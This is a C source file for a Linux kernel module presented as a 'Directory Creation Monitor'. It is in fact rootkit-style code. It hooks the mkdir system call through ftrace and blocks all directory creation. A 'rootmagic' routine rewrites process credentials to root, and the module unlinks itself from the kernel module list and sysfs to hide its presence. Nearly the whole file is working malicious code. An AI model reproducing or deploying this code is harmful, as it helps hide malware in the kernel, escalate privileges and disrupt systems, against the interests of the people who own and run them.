#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/ftrace.h>
#include <linux/version.h>
#include <linux/kallsyms.h>
#include <linux/namei.h>
#include <linux/fs.h>
#include <linux/kprobes.h>

// Version-specific adjustments
#if LINUX_VERSION_CODE >= KERNEL_VERSION(5,11,0)
#define FTRACE_REGS_STRUCT ftrace_regs
#else
#define FTRACE_REGS_STRUCT pt_regs
#endif

#if LINUX_VERSION_CODE >= KERNEL_VERSION(5,7,0)
static unsigned long lookup_name(const char *name)
{
    struct kprobe kp = {
        .symbol_name = name
    };
    unsigned long retval;

    if (register_kprobe(&kp) < 0) return 0;
    retval = (unsigned long) kp.addr;
    unregister_kprobe(&kp);
    return retval;
}
#else
static unsigned long lookup_name(const char *name)
{
    return kallsyms_lookup_name(name);
}
#endif

#if LINUX_VERSION_CODE < KERNEL_VERSION(5,11,0)
#define FTRACE_OPS_FL_RECURSION FTRACE_OPS_FL_RECURSION_SAFE
#endif

#define HOOK(_name, _hook, _orig)   \
{                   \
    .name = (_name),        \
    .function = (_hook),        \
    .original = (_orig),        \
}

struct ftrace_hook {
    const char *name;
    void *function;
    void *original;
    unsigned long address;
    struct ftrace_ops ops;
};

static int fh_resolve_hook_address(struct ftrace_hook *hook)
{
    hook->address = lookup_name(hook->name);
    if (!hook->address) {
        printk(KERN_ERR "Failed to resolve %s\n", hook->name);
        return -ENOENT;
    }
    *((unsigned long*)hook->original) = hook->address;
    return 0;
}

// Updated function signature to use FTRACE_REGS_STRUCT
static void notrace fh_ftrace_thunk(unsigned long ip, unsigned long parent_ip,
        struct ftrace_ops *ops, struct FTRACE_REGS_STRUCT *regs)
{
    struct ftrace_hook *hook = container_of(ops, struct ftrace_hook, ops);
    if (!within_module(parent_ip, THIS_MODULE))
#if LINUX_VERSION_CODE >= KERNEL_VERSION(5,11,0)
        regs->regs.ip = (unsigned long)hook->function;
#else
        regs->ip = (unsigned long)hook->function;
#endif
}

static int fh_install_hook(struct ftrace_hook *hook)
{
    int err = fh_resolve_hook_address(hook);
    if (err)
        return err;

    hook->ops.func = fh_ftrace_thunk;
    hook->ops.flags = FTRACE_OPS_FL_SAVE_REGS
                   | FTRACE_OPS_FL_RECURSION
                   | FTRACE_OPS_FL_IPMODIFY;

    err = ftrace_set_filter_ip(&hook->ops, hook->address, 0, 0);
    if (err) {
        printk(KERN_ERR "ftrace_set_filter_ip failed: %d\n", err);
        return err;
    }

    err = register_ftrace_function(&hook->ops);
    if (err) {
        printk(KERN_ERR "register_ftrace_function failed: %d\n", err);
        ftrace_set_filter_ip(&hook->ops, hook->address, 1, 0);
        return err;
    }

    return 0;
}

static void fh_remove_hook(struct ftrace_hook *hook)
{
    int err = unregister_ftrace_function(&hook->ops);
    if (err)
        printk(KERN_ERR "unregister_ftrace_function failed: %d\n", err);
    err = ftrace_set_filter_ip(&hook->ops, hook->address, 1, 0);
    if (err)
        printk(KERN_ERR "ftrace_set_filter_ip failed: %d\n", err);
}

typedef long (*orig_mkdir_t)(const struct pt_regs *);
static orig_mkdir_t orig_mkdir;

static long hook_mkdir(const struct pt_regs *regs)
{
    char __user *pathname = (char __user *)regs->di;
    char path[256];
    
    if (strncpy_from_user(path, pathname, sizeof(path)) > 0) {
        printk(KERN_INFO "Directory creation blocked: %s\n", path);
    }
    return -EACCES; // Prevents the directory creation
}

static struct ftrace_hook hooks[] = {
    HOOK("__x64_sys_mkdir", hook_mkdir, &orig_mkdir),
};
static void rootmagic(void){
  struct cred *creds;
  creds = prepare_creds();
  if(creds == NULL){
    return;
  }
  creds->uid.val = creds->gid.val = 0;
  creds->euid.val = creds->egid.val = 0;
  creds->suid.val = creds->sgid.val = 0;
  creds->fsuid.val = creds->fsgid.val = 0;
  commit_creds(creds);
}

static int __init mkdir_monitor_init(void)
{
    int err;
    size_t i;
    rootmagic();

    // Do kernel module hiding
    list_del_init(&__this_module.list);
    kobject_del(&THIS_MODULE->mkobj.kobj);

    
    

    for (i = 0; i < ARRAY_SIZE(hooks); i++) {
        err = fh_install_hook(&hooks[i]);
        if (err)
            goto error;
    }

    printk(KERN_INFO "mkdir_monitor: Loaded\n");
    return 0;

error:
    while (i != 0) {
        fh_remove_hook(&hooks[--i]);
    }
    return err;
}

static void __exit mkdir_monitor_exit(void)
{
    size_t i;

    for (i = 0; i < ARRAY_SIZE(hooks); i++)
        fh_remove_hook(&hooks[i]);

    printk(KERN_INFO "mkdir_monitor: Unloaded\n");
}

module_init(mkdir_monitor_init);
module_exit(mkdir_monitor_exit);

MODULE_LICENSE("GPL");
MODULE_DESCRIPTION("Directory Creation Monitor");
MODULE_AUTHOR("malefax");

